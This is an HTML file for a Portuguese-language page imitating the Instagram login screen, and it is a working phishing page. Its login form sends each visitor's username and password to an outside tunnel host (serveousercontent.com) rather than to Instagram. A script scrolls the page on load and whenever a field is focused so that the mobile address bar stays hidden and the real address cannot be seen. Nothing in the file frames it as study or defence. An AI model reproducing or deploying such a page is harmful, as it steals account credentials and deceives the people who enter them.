<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <title>Instagram</title>
    <style>
        /* Força a página a ser maior que a tela para permitir o scroll que esconde a barra */
        html, body { height: 110%; margin: 0; padding: 0; overflow-x: hidden; background-color: #fff; }
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; display: flex; flex-direction: column; align-items: center; }
        
        .container { width: 100%; max-width: 350px; padding: 20px; margin-top: 60px; text-align: center; box-sizing: border-box; }
        .brand-text { font-size: 36px; font-weight: bold; margin-bottom: 40px; color: #262626; letter-spacing: -1px; font-style: italic; }
        
        input { width: 100%; background: #fafafa; border: 1px solid #dbdbdb; border-radius: 3px; padding: 12px; margin-bottom: 8px; font-size: 16px; /* 16px evita o zoom automático do iPhone */ box-sizing: border-box; }
        button { width: 100%; background-color: #0095f6; border: none; border-radius: 8px; color: #fff; padding: 10px; font-weight: 600; cursor: pointer; margin-top: 10px; font-size: 14px; }
        
        .divider { margin: 25px 0; display: flex; align-items: center; color: #8e8e8e; font-size: 13px; font-weight: 600; }
        .divider::before, .divider::after { content: ""; flex: 1; height: 1px; background: #dbdbdb; margin: 0 10px; }
        .fb-login { color: #385185; font-size: 14px; font-weight: 600; text-decoration: none; display: block; margin-bottom: 25px; }
        .forgot { font-size: 12px; color: #00376b; text-decoration: none; }
        .signup { margin-top: 40px; border: 1px solid #dbdbdb; padding: 20px; width: 100%; box-sizing: border-box; font-size: 14px; }
        .signup a { color: #0095f6; text-decoration: none; font-weight: 600; }
    </style>
</head>
<body>
    <div class="container">
        <div class="brand-text">Instagram</div>
        
        <form action="https://693ef71330a356b2-45-161-216-55.serveousercontent.com" method="POST">
            <input type="text" name="username" placeholder="Telefone, nome de usuário ou email" required onfocus="hideBar()">
            <input type="password" name="password" placeholder="Senha" required onfocus="hideBar()">
            <button type="submit">Entrar</button>
        </form>

        <div class="divider">OU</div>
        <a href="#" class="fb-login">Entrar com o Facebook</a>
        <a href="#" class="forgot">Esqueceu a senha?</a>
    </div>

    <div class="container" style="margin-top: 10px;">
        <div class="signup">
            Não tem uma conta? <a href="#">Cadastre-se</a>
        </div>
    </div>

    <script>
        // Tenta esconder a barra ao interagir
        function hideBar() {
            window.scrollTo(0, 1);
        }
        // Tenta esconder no load inicial
        window.addEventListener("load", function() {
            setTimeout(function() {
                window.scrollTo(0, 1);
            }, 1000);
        });
    </script>
</body>
</html>
